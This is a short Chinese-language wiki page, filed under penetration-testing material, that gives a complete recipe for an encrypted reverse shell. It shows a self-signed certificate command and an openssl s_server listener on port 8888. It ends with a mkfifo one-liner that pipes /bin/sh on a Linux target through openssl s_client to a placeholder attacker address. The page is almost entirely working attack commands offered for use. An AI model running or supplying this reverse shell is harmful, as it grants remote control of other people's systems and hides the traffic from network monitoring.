<languages  />

<translate>

生成自簽名證書
--------------

</translate>

    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

<translate>

服務端監聽8888端口
------------------

</translate>

    openssl s_server -quiet -key key.pem -cert cert.pem -port 8888

<translate>

Linux下使用mkfifo進行反彈shell
------------------------------

</translate>

    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect Your ip:Your port> /tmp/s; rm /tmp/s

[Categories:滲透測試資料](Categories:滲透測試資料 "wikilink")